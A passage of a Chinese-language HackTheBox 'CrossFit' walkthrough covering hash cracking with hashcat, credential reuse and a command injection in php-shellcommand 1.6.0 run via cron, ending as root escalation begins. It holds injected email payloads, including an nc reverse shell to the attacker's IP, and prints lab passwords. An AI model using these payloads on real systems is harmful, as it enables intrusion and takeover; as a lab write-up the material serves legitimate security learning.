+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*  *    * * *    isaac    /usr/bin/php /home/isaac/send_updates/send_updates.php</span><br></pre></td></tr></table></figure>
+
+<p>看一下文件，好像很厉害的权限的样子（竟然不是 root</p>
+<p><img src="/img/htb-crossfit/image-20210814222201159.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814222201159.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814222201159"></p>
+<p>内核漏洞没有，看来只能爆破哈希了 （</p>
+<p>有两个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/ftp/database/factories/UserFactory.php:$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi</span><br></pre></td></tr></table></figure>
+
+<p>帐号是 <code>hank</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/ansible/playbooks/adduser_hank.yml:$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/</span><br></pre></td></tr></table></figure>
+
+<p>谷歌一下前面的 <code>$2y</code> 和 <code>$6</code> 特征，发现维基上有总结<sup><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Crypt_(C)">[7]</a></sup></p>
+<table>
+<thead>
+<tr>
+<th align="left">Scheme id</th>
+<th align="left">Schema</th>
+<th align="left">Example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"></td>
+<td align="left"><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Data_Encryption_Standard">DES</a></td>
+<td align="left"><code>Kyq4bCxAXJkbg</code></td>
+</tr>
+<tr>
+<td align="left">_</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Berkeley_Software_Design">BSDi</a></td>
+<td align="left"><code>_EQ0.jzhSVeUyoSqLupI</code></td>
+</tr>
+<tr>
+<td align="left">1</td>
+<td align="left">MD5</td>
+<td align="left"><code>$1$etNnh7FA$OlM7eljE/B7F1J4XYNnk81</code></td>
+</tr>
+<tr>
+<td align="left">2, 2a, 2x, 2y</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Bcrypt">bcrypt</a></td>
+<td align="left"><code>$2a$10$VIhIOofSMqgdGlL4wzE//e.77dAQGqntF/1dT7bqCrVtquInWy2qi</code></td>
+</tr>
+<tr>
+<td align="left">3</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/NTLM_Authentication">NTHASH</a></td>
+<td align="left"><code>$3$$8846f7eaee8fb117ad06bdd830b7586c</code></td>
+</tr>
+<tr>
+<td align="left">5</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/SHA-2">SHA-256</a></td>
+<td align="left"><code>$5$9ks3nNEqv31FX.F$gdEoLFsCRsn/WRN3wxUnzfeZLoooVlzeF4WjLomTRFD</code></td>
+</tr>
+<tr>
+<td align="left">6</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/SHA-2">SHA-512</a></td>
+<td align="left"><code>$6$qoE2letU$wWPRl.PVczjzeMVgjiA8LLy2nOyZbf7Amj3qLIL978o18gbMySdKZ7uepq9tmMQXxyTIrS12Pln.2Q/6Xscao0</code></td>
+</tr>
+<tr>
+<td align="left">md5</td>
+<td align="left">Solaris MD5</td>
+<td align="left"><code>$md5,rounds=5000$GUBv0xjJ$$mSwgIswdjlTY0YxV7HBVm0</code></td>
+</tr>
+<tr>
+<td align="left">sha1</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/PBKDF1">PBKDF1</a> with <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/SHA-1">SHA-1</a></td>
+<td align="left"><code>$sha1$40000$jtNX3nZ2$hBNaIXkt4wBI2o5rsi8KejSjNqIq</code></td>
+</tr>
+<tr>
+<td align="left">y</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Yescrypt">yescrypt</a></td>
+<td align="left"><code>$y$j9T$F5Jx5fExrKuPp53xLKQ..1$X3DX6M94c7o.9agCG9G317fhZg9SqC.5i5rd.RhAtQ7</code></td>
+</tr>
+</tbody></table>
+<p>对应两个哈希方式分别为 <code>bcrypt</code> 和 <code>SHA-512</code></p>
+<p>按之前玩国外CTF和靶机的经验，国外弱口令破解一般用 <code>rockyou.txt</code> ( kali 自动 <code>sudo find / | grep rockyou.txt</code>)</p>
+<p>在 hashcat 上找对应哈希算法的值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hashcat --example-hashes | grep -i -A 1 -B 1 bcrypt</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># MODE: 3200</span></span><br><span class="line"><span class="comment"># TYPE: bcrypt $2*$, Blowfish (Unix)</span></span><br><span class="line"><span class="comment"># HASH: $2a$05$MBCzKhG1KhezLh.0LRa0Kuw12nLJtpHy6DIaU.JAnqJUDYspHC.Ou</span></span><br><span class="line">hashcat --example-hashes | grep -i -A 1 -B 1 sha512</span><br><span class="line"><span class="comment"># 从输出中找到</span></span><br><span class="line"><span class="comment"># MODE: 1800</span></span><br><span class="line"><span class="comment"># TYPE: sha512crypt $6$, SHA512 (Unix)</span></span><br><span class="line"><span class="comment"># HASH: $6$72820166$U4DVzpcYxgw7MVVDGGvB2/H5lRistD5.Ah4upwENR5UtffLR4X4SxSzfREv8z6wVl0jRFX40/KnYVvK4829kD1</span></span><br></pre></td></tr></table></figure>
+
+<p>先试试 <code>bcrypt</code> 看着没那么费时间，没解出来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 3200 crossfit_bcrypt ~/Sec/Web/selffuzz/rockyou.txt -r /usr/<span class="built_in">local</span>/Cellar/hashcat/6.1.1/share/doc/hashcat/rules/best64.rule --force</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-m 哈希类型，通过 –example-hashes 查到的</li>
+<li>crossfit_bcrypt 为文件，内容为我们要破解的哈希 <code>$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi</code></li>
+<li>-r 规则，即对原有字典的一些替换、移位和变异等<sup><a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">[8]</a></sup>，kali 上文件在 <code>/usr/share/hashcat/rules/best64.rule</code></li>
+<li>–force 忽略警告</li>
+</ul>
+<p>SHA-512 破解得密码：<code>powerpuffgirls</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1800 crossfit_sha512 ~/Sec/Web/selffuzz/rockyou.txt -r /usr/local/Cellar/hashcat/6.1.1/share/doc/hashcat/rules/best64.rule --force</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb-crossfit/image-20210815114056833.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210815114056833.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210815114056833"></p>
+<p>ssh 登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh hank@10.10.10.208 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb-crossfit/image-20210815120536153.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210815120536153.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210815120536153"></p>
+<h3 id="权限提升-获取同组用户权限-（可选）"><a href="#权限提升-获取同组用户权限-（可选）" class="headerlink" title="权限提升 - 获取同组用户权限 （可选）"></a>权限提升 - 获取同组用户权限 （可选）</h3><h4 id="命令执行利用"><a href="#命令执行利用" class="headerlink" title="命令执行利用"></a>命令执行利用</h4><ul>
+<li><p><code>/home/hank/</code>有个 user.txt 不知道是啥来的，扔 cmd5 查不到</p>
+</li>
+<li><p>发现可查看 isaac 用户的文件，里面有 send_updates/send_updates.php，刚好与 linpeas 发现的计划任务（/etc/crontab）对应，会每隔一分钟执行一遍，不过同组不可编辑，<code>require</code>进来的 includes/ 目录不可查看。该文件使用了一个外部依赖 <code>use mikehaertl\shellcommand\Command;</code>，发现一个外部可控的参数，<code>$command-&gt;addArg($row[&#39;email&#39;], $escape=true);</code> 不过好像进行转义了</p>
+</li>
+</ul>
+<p>说起邮件，突然想起这个页面 <a target="_blank" rel="noopener" href="http://gym-club.crossfit.htb/jointheclub.php">http://gym-club.crossfit.htb/jointheclub.php</a> ，难道说，就是提取的这个邮箱发送东西的？</p>
+<p><img src="/img/htb-crossfit/image-20210815123203733.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210815123203733.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210815123203733"></p>
+<ul>
+<li>原来 send_updates 也是用 Laravel 写的，查看 composer.json，发现  <code>&quot;mikehaertl/php-shellcommand&quot;: &quot;1.6.0&quot;</code> 版本为 1.6.0。</li>
+</ul>
+<p>先查查这个组件这个版本有没有nday，谷歌一下 <code>mikehaertl/php-shellcommand 1.6.0</code>，果然有<sup><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426">[9]</a></sup>，</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mikehaertl/php-shellcommand/issues/44">issue44</a> 给出了两种利用方式，我们这是邮箱可控（<code>$key</code>），没有传入 <code>value</code> 值，并通过 <code>addArg</code> 指定了 <code>$escape=true</code>，好像，，，利用不了？见<a href="#3%E3%80%81PHP%E6%8C%87%E5%AE%9A%E5%BD%A2%E6%95%B0%EF%BC%8C%E4%BC%A0%E5%85%A5%E7%9A%84%E4%B8%8D%E6%98%AF%E6%8C%87%E5%AE%9A%E7%9A%84%E5%BD%A2%E5%8F%82">遇到的问题3</a> ，也就是 <code>$escape</code> 当作 <code>$value</code> 传入，导致 <code>$key</code> 没有被转移，进而导致命令注入</p>
+<p>整理下思路：先看看 <code>$row[&#39;email&#39;]</code> 可不可控，如果可控则可通过 isaac 身份执行的计划任务执行命令</p>
+<p>尝试了一下，看了源码，<code>filter_var($email, FILTER_VALIDATE_EMAIL)</code> 可以进行绕过，不过好像插入了没反应，突然想到应该确认是不是真的写进去了，<code>db.php</code> 发现数据库密码，直接连上去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -ucrossfit -p<span class="string">&quot;oeLoo~y2baeni&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>确实写进入了，而且为了也试了手动插入数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users (email) <span class="keyword">values</span> (&quot;123@qq.com||touch /tmp/pwn&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb-crossfit/image-20210828183233102.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210828183233102.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210828183233102"></p>
+<p>没有成功执行命令</p>
+<p><img src="/img/htb-crossfit/image-20210828184514854.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210828184514854.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210828184514854"></p>
+<p>仔细看了一下源码发现还有个文件遍历，要有文件才能执行下面的逻辑，但是这个 <code>$msg_dir</code> 未知，然后 <code>includes/</code> 目录又没权限，晕…</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/***************************************************</span></span><br><span class="line"><span class="comment"> * Send email updates to users in the mailing list *</span></span><br><span class="line"><span class="comment"> ***************************************************/</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;vendor/autoload.php&quot;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;includes/functions.php&quot;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;includes/db.php&quot;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;includes/config.php&quot;</span>);</span><br><span class="line"><span class="keyword">use</span> <span class="title">mikehaertl</span>\<span class="title">shellcommand</span>\<span class="title">Command</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$fs_iterator</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="variable">$msg_dir</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$fs_iterator</span> <span class="keyword">as</span> <span class="variable">$file_info</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file_info</span>-&gt;isFile())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$full_path</span> = <span class="variable">$file_info</span>-&gt;getPathname();</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;query(<span class="string">&#x27;SELECT email FROM users&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$res</span>-&gt;fetch_array(MYSQLI_ASSOC))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$command</span> = <span class="keyword">new</span> Command(<span class="string">&#x27;/usr/bin/mail&#x27;</span>);</span><br><span class="line">                <span class="variable">$command</span>-&gt;addArg(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;CrossFit Club Newsletter&#x27;</span>, <span class="variable">$escape</span>=<span class="literal">true</span>);</span><br><span class="line">                <span class="variable">$command</span>-&gt;addArg(<span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>], <span class="variable">$escape</span>=<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="variable">$msg</span> = file_get_contents(<span class="variable">$full_path</span>);</span><br><span class="line">                <span class="variable">$command</span>-&gt;setStdIn(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">                <span class="variable">$command</span>-&gt;execute();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unlink(<span class="variable">$full_path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cleanup();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="寻找高权限FTP用户"><a href="#寻找高权限FTP用户" class="headerlink" title="寻找高权限FTP用户"></a>寻找高权限FTP用户</h4><p>文件路径，或许应该从文件服务入手，如果系统里有更高权限的ftp用户，或许就可以读 <code>includes/</code> 目录的文件或写入文件至 <code>$msg_dir</code> ，然后使命令执行条件满足？</p>
+<p>发现 ftp 也是 laravel，发现 <code>.env</code> 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/ftp/.env</span><br><span class="line"><span class="comment"># DB_USERNAME=ftphosting</span></span><br><span class="line"><span class="comment"># DB_PASSWORD=&#125;2WZk.X;u&#123;L&gt;V</span></span><br></pre></td></tr></table></figure>
+
+<p>连一下数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uftphosting -p<span class="string">&quot;&#125;2WZk.X;u&#123;L&gt;V&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>看了一下 <code>accounts</code> 表开始反思，xss+csrf 利用的ftp 是个web页面，数据是插入数据库的，那我是怎么通过 vsftp 连上去的咧 ？</p>
+<p>看一下 ftp 相关用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># ftp:x:108:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span></span><br><span class="line"><span class="comment"># vsftpd:x:1002:1002::/var/vsftpd:/bin/false</span></span><br><span class="line"><span class="comment"># ftpadm:x:1003:1004::/srv/ftp:/usr/sbin/nologin </span></span><br></pre></td></tr></table></figure>
+
+<p>看一下配置文件，提取一下主要的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find /etc/ | grep ftp</span><br><span class="line"><span class="comment"># /etc/ftpusers</span></span><br><span class="line"><span class="comment"># /etc/vsftpd/user_conf/ftpadm</span></span><br><span class="line"><span class="comment"># /etc/pam.d/vsftpd</span></span><br><span class="line"><span class="comment"># /etc/vsftpd.conf</span></span><br></pre></td></tr></table></figure>
+
+<p>仔细对比了一下，这个 <code>ftpadm</code> 用户是一个真正的系统用户，和我们一开始通过 xss+ccsrf 创建的 ftp 用户有些许不一样（存在数据库里的）</p>
+<p>看下配置文件 <code>/etc/vsftpd.conf</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">local_enable=YES</span><br><span class="line">pam_service_name=vsftpd</span><br><span class="line">user_config_dir=/etc/vsftpd/user_conf</span><br></pre></td></tr></table></figure>
+
+<p>参考vsftpd官方文档<sup><a target="_blank" rel="noopener" href="https://security.appspot.com/vsftpd/vsftpd_conf.html">10</a></sup></p>
+<ul>
+<li>local_enable 表示可用 /etc/passwd 里的用户进行登录</li>
+<li>pam_service_name 使用 pam进行认证，对应的文件在 <code>/etc/pam.d/vsftpd</code></li>
+<li>user_config_dir 详细配置特定用户</li>
+</ul>
+<p>看下 pam 目录文件，奇奇怪怪的姿势增加了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/pam.d/vsftpd</span><br></pre></td></tr></table></figure>
+
+<p>原来还可以通过 <a target="_blank" rel="noopener" href="https://github.com/NigelCunningham/pam-MySQL">pam_mysql.so</a> + MariaDB（MySQL） 认证 FTP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">auth sufficient pam_mysql.so user=ftpadm passwd=8W)&#125;gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3</span><br><span class="line">account sufficient pam_mysql.so user=ftpadm passwd=8W)&#125;gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3</span><br><span class="line"></span><br><span class="line"><span class="comment"># Standard behaviour for ftpd(8).</span></span><br><span class="line">auth    required        pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed</span><br><span class="line"></span><br><span class="line"><span class="comment"># Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Standard pam includes</span></span><br><span class="line">@include common-account</span><br><span class="line">@include common-session</span><br><span class="line">@include common-auth</span><br><span class="line">auth    required        pam_shells.so</span><br></pre></td></tr></table></figure>
+
+<p>其中配置里的 <code>sufficient</code> 表示当该模块匹配成功后，不会继续匹配其他模块，如果匹配失败了会匹配其他模块。</p>
+<p>也就是说这个 ftpadm 用户是用于连接MariaDB，然后读取其中的 ftphosting.accounts 表的  username 和 pass 字段，来判断我们通过 21 端口登录的用户密码是否正确。如果数据库认证失败了，会通过<code>pam_unix.so</code> 认证系统用户</p>
+<p>然后最后一行 <code>auth required pam_shells.so</code><sup><a target="_blank" rel="noopener" href="https://linux.die.net/man/8/pam_shells">[11]</a></sup>，就很关键了，即表示 <code>/etc/shells</code>记录可登入的shell类型，比如常见的有 <code>/bin/zsh</code> <code>/bin/sh</code> <code>/bin/bash</code>，看看 <code>cat /etc/shells</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/rbash</span><br><span class="line">/bin/dash</span><br><span class="line">/usr/bin/dash</span><br><span class="line">/usr/sbin/nologin</span><br></pre></td></tr></table></figure>
+
+<p>震惊，竟然 <code>/usr/sbin/nologin</code> 也是可登录的，然后 <code>ftpadm</code> 用户也刚好是  <code>/usr/sbin/nologin</code> ，数据库的帐号密码刚好知道，<code>user=ftpadm passwd=8W)&#125;gpRJvAmnb</code>，会不会这个用户的密码就是这个咧？</p>
+<p>尝试一下 <code>ftpadm/8W)&#125;gpRJvAmnb</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lftp</span><br><span class="line"><span class="built_in">set</span> ftp:ssl-force <span class="literal">true</span></span><br><span class="line"><span class="built_in">set</span> ssl:verify-certificate no</span><br><span class="line">connect 10.10.10.208</span><br><span class="line">login tari tari</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb-crossfit/image-20210829210857205.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210829210857205.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210829210857205"></p>
+<p>登录进去了！</p>
+<p>瞎猜一下，这个会不会就是 <code>$msg_dir</code> 的目录呢？</p>
+<p>先上传个文件上去</p>
+<p><img src="/img/htb-crossfit/image-20210829213142040.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210829213142040.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210829213142040"></p>
+<p>然后邮箱构造为</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=`touch$&#123;IFS&#125;/tmp/pwn`@qq.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb-crossfit/image-20210829213225006.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210829213225006.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210829213225006"></p>
+<p>命令执行成功</p>
+<p><img src="/img/htb-crossfit/image-20210829213258783.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210829213258783.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210829213258783"></p>
+<p>反弹个shell</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=`nc$&#123;IFS&#125;10.10.14.39$&#123;IFS&#125;2233$&#123;IFS&#125;-e$&#123;IFS&#125;/bin/bash`@qq.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb-crossfit/image-20210829225112602.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210829225112602.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210829225112602"></p>
+<p>顺便确认一下 <code>$msg_dir</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">isaac@crossfit:~/send_updates$ cat includes/config.php</span><br><span class="line">cat includes/config.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$msg_dir</span> = <span class="string">&quot;/srv/ftp/messages&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="权限提升-获取root权限"><a href="#权限提升-获取root权限" class="headerlink" title="权限提升 - 获取root权限"></a>权限提升 - 获取root权限</h3><p>传个 <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy64</a></p>
